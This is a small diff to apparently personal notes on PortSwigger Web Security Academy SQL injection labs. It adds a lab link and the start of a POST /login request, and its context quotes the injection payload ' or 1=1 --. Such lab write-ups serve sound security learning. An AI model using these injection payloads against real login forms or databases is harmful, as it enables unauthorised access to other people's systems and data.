@@ -39,8 +39,10 @@ then use **'  or 1=1 --**  now it shows all product  means the query executed he
 
 
 # Lab: SQL injection vulnerability allowing login bypass
+Link: https://portswigger.net/web-security/sql-injection/lab-login-bypass
 
 
+request sent for exploiting the sqli:
 `POST /login HTTP/2`
 `Host: 0aa7008f03eaa71f85d6a4ef008900df.web-security-academy.net`
 `Cookie: session=QE7wOVq0qOUdFqMPKnt2jdgFzMOR1RFC`
